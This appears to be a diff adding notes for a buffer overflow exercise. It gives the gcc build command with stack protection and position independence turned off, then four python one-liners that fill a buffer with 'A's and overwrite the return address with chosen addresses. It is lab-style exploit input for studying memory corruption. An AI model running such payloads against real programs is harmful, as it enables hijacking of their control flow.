@@ -1,0 +1,6 @@
+Executable created by: gcc -no-pie -g -fno-stack-protector -o buffer_overflow Buffer_Overflow#.c
+
+1. $(python -c "print 'A'*40 + '\x1f\x06\x40\x00'")
+2. $(python -c "print 'A'*56 + '\x25\x06\x40\x00'")
+3. $(python -c "print 'A'*40 + '\xb2\x06\x40\x00'")
+4. $(python -c "print 'A'*56 + '\x1f\x06\x40\x00'")
